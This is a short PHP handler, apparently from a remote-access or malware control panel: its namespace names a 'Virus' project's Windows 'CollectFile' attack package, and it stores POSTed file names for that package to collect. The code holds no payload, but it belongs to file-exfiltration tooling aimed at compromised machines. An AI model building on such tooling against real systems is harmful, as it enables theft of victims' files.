<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectFile\CollectFile;

/** @var CollectFile $this */

$fileNames = $this->requestData->postCheck("fileNames");

$this->setFileNames($fileNames);
$this->saveState();
